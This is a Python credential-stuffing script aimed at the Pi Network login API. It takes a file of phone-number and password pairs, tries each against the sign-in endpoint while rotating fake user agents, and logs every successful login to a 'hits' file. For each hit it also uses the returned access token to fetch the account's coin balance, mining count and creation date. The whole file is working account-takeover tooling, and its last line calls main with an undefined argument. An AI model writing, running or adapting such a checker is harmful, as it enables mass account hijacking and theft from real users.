import requests
import os
import sys
import concurrent.futures
from faker import Faker

fake = Faker()

url = "https://socialchain.app/api/password_sign_in"
headers = {
    "Host": "socialchain.app",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=utf-8",
    "Origin": "https://app-cdn.minepi.com",
    "W": "1",
    "Referer": "https://app-cdn.minepi.com/",
    "Accept-Language": "en-us",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close"
}

def usgnt___anasssss():
    return fake.user_agent()

def format_phone_number(phone_number):
    sexyyyyyyy = ['751', '752', '750', '770', '771', '772', '780', '781', '782']
    if phone_number.startswith(tuple(sexyyyyyyy)):
        return '964' + phone_number
    elif not phone_number.startswith('964'):
        return '964' + phone_number
    return phone_number

def checkerrrrrr(user_pass):
    user, password = user_pass.split(":")
    formatted_user = format_phone_number(user)
    payload = {"phone_number": formatted_user, "password": password}

    headers["User-Agent"] = usgnt___anasssss()

    try:
        response = requests.post(url, json=payload, headers=headers)

        if "Invalid phone number" in response.text or "An unexpected error occurred" in response.text:
            result = "Bad"
        elif "access_token" in response.text or "Bearer\\" in response.text:
            result = "Hits"
           
            access_token = response.text.split('"access_token":"')[1].split('"')[0]
            
           
            url2 = 'https://socialchain.app/api/pi'
            headers2 = {
                "Host": "socialchain.app",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://app-cdn.minepi.com",
                "Authorization": f"Bearer {access_token}",
                "Referer": "https://app-cdn.minepi.com/",
                "W": "1",
                "Accept-Language": "en-us",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close"
            }
            
            capture_response = requests.get(url2, headers=headers2).text
            balance = capture_response.split('balance":')[1].split(',"')[0]
            total_minings = capture_response.split('completed_sessions_count":')[1].split(',"')[0]
            created = capture_response.split('computed_at":"')[1].split('T')[0]
            is_mining = capture_response.split('"is_mining":')[1].split(',')[0]
            
            
            with open("PiNetwork-Hits.txt", "a") as hits_file:
                hits_file.write(f"{formatted_user}:{password} | Balance = {balance} | Mining = {total_minings} | Created at = {created} | Still Mining = {is_mining}\n")
        else:
            result = "Bad"

        return result
    except requests.exceptions.RequestException as e:
        return "Bad"

def print_stats(hits_count, bads_count):
    os.system("clear")
    print("-" * 60)
    print(f" > \033[1;32mHits {hits_count}\033[0m | \033[1;31mBad {bads_count}\033[0m")
    print("-" * 60)

def main():
    hits_count = 0
    bads_count = 0
    combo_file = input(" [!] Combo: ")

    with open(combo_file, "r") as file:
        users_passes = file.readlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(checkerrrrrr, user_pass.strip()) for user_pass in users_passes]

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result == "Hits":
                hits_count += 1
            else:
                bads_count += 1
            print_stats(hits_count, bads_count)

if __name__ == "__main__":
    main(Zamya)
    
